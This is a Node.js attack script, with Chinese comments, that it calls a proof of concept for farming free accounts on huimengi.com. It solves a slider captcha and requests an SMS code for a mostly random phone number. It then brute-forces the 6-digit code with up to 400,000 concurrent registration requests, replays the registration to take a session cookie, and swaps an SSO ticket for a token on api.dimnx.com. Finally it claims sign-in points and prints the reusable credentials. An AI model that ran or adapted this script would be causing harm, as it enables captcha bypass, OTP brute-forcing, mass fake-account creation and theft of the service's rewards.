// huimengi 免费账号自动化：滑块 -> 发码 -> 验证码爆破 -> 注册 -> SSO 换主站 token -> 领积分
// 用法: node poc_free_account.mjs [--phone 19900000123] [--max 400000] [--conc 200]
import { captchaVerification, B, UA } from './lib_captcha.mjs';

const argv = process.argv.slice(2);
const arg = (k, d) => { const i = argv.indexOf('--' + k); return i >= 0 ? argv[i + 1] : d; };
const rand = n => Array.from({ length: n }, () => '0123456789abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 36)]).join('');
const phone = arg('phone') || ('1990000' + String(Math.floor(Math.random() * 9000) + 1000));
const MAX = Number(arg('max', 400000));
const CONC = Number(arg('conc', 200));
const PWD = 'Passw0rd!23';
const TNAME = 't' + rand(9);

const post = async (url, body, headers = {}) => {
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': UA, Origin: 'https://huimengi.com', ...headers }, body: JSON.stringify(body), signal: AbortSignal.timeout(8000) });
      const t = await r.text();
      try { return { r, j: JSON.parse(t) }; } catch { return { r, j: t }; }
    } catch (e) {
      if (attempt === 2) return { r: null, j: { code: 'NET', msg: 'net:' + e.message } };
      await new Promise(z => setTimeout(z, 150));
    }
  }
};

console.log('[1] 解滑块 + 发验证码 ->', phone);
const cv = await captchaVerification(() => {});
const sms = await post(B + '/api/auth/sms/send', { phone, scene: 'register', captchaVerification: cv });
console.log('    sms:', JSON.stringify(sms.j).slice(0, 200));
if (String(sms.j.code) !== '0') { console.log('    发码失败，退出（可能触发频控）'); process.exit(1); }

console.log('[2] 爆破 6 位验证码，上限', MAX, '并发', CONC);
let found = null, tried = 0;
const t0 = Date.now();
outer:
while (tried < MAX) {
  const batch = [];
  for (let i = 0; i < CONC && tried + i < MAX; i++) {
    const c = String(Math.floor(Math.random() * 1000000)).padStart(6, '0');
    batch.push(post(B + '/api/auth/register', { phone, password: PWD, code: c, tenantName: TNAME })
      .then(({ j }) => ({ c, j })));
  }
  const res = (await Promise.allSettled(batch)).map(x => x.status === 'fulfilled' ? x.value : { c: '000000', j: { code: 'NET', msg: 'net' } });
  tried += res.length;
  for (const { c, j } of res) {
    const msg = String(j.msg || '');
    if (String(j.code) === '0' || msg.includes('团队名称已存在')) { found = c; break outer; }
    if (msg.includes('该手机号已注册')) { console.log('    号码已注册，换号重跑'); process.exit(2); }
  }
  if (tried % 20000 < CONC) process.stdout.write('\r    已试 ' + tried + ' / ' + MAX + '  用时 ' + ((Date.now() - t0) / 1000).toFixed(1) + 's');
}
console.log('');
if (!found) { console.log('    未命中（概率未中，重跑即可）'); process.exit(3); }
console.log('[3] 命中验证码:', found, ' 用时', ((Date.now() - t0) / 1000).toFixed(1) + 's');

// 重放换取 Set-Cookie（注册成功响应可能不带 cookie）
let cookie = null;
for (let i = 0; i < 3 && !cookie; i++) {
  const { r, j } = await post(B + '/api/auth/register', { phone, password: PWD, code: found, tenantName: TNAME });
  const sc = (r.headers.getSetCookie?.() || []).join(';') || r.headers.get('set-cookie') || '';
  const m = /Hm-Token=([^;]+)/.exec(sc);
  if (m) cookie = 'Hm-Token=' + m[1];
  console.log('    register replay', i, '=>', String(j.code), (j.data && j.data.nickname) || j.msg || '');
}
console.log('[4] 会话 cookie:', cookie || '（未拿到，需人工用浏览器登录）');

// SSO -> 主站 token
let token = null, tenantId = null, tenantCode = null, userId = null;
if (cookie) {
  const g = await fetch(B + '/sso/getRedirectUrl', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, Cookie: cookie }, body: new URLSearchParams({ client: 'platform', redirect: 'https://huimengi.com/home', brand: 'huimengi', inviteCode: '' }).toString() });
  const gj = await g.json();
  const ticket = new URL(gj.data).searchParams.get('ticket');
  const tid = new URL(gj.data).searchParams.get('tenantId') || '';
  console.log('[5] ticket:', ticket);
  const x = await fetch('https://api.dimnx.com/sso/doLoginByTicket', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, Origin: 'https://huimengi.com' }, body: new URLSearchParams({ ticket, inviteCode: '' }).toString() });
  const xj = await x.json();
  if (xj.code === 200 && xj.data) { token = xj.data.token; tenantId = xj.data.tenantId; tenantCode = xj.data.tenantCode; userId = xj.data.userId; }
  console.log('[6] 主站 token:', token ? 'OK' : 'FAIL ' + JSON.stringify(xj).slice(0, 200));
}

if (token) {
  const H = { Authorization: 'Bearer ' + token, 'x-tenant-id': tenantId, 'x-tenant-code': tenantCode, 'Content-Type': 'application/json', 'User-Agent': UA };
  const me = await (await fetch('https://api.dimnx.com/api/users/me', { headers: H })).json();
  const before = await (await fetch('https://api.dimnx.com/api/billing/points/overview', { headers: H })).json();
  const sign = await (await fetch('https://api.dimnx.com/api/daily-visit/sign-in', { method: 'POST', headers: H, body: '{}' })).json();
  const after = await (await fetch('https://api.dimnx.com/api/billing/points/overview', { headers: H })).json();
  console.log('[7] 账号:', me.data && me.data.nickname, me.data && me.data.username, me.data && me.data.phone);
  console.log('    签到:', JSON.stringify(sign.data));
  console.log('    积分(签到前):', JSON.stringify(before.data));
  console.log('    积分(签到后):', JSON.stringify(after.data));
  console.log('\n===== 可复用凭据 =====');
  console.log('phone      :', phone);
  console.log('password   :', PWD);
  console.log('tenantName :', TNAME);
  console.log('tenantId   :', tenantId);
  console.log('tenantCode :', tenantCode);
  console.log('userId     :', userId);
  console.log('Hm-Token   :', cookie);
  console.log('site_token :', token);
}
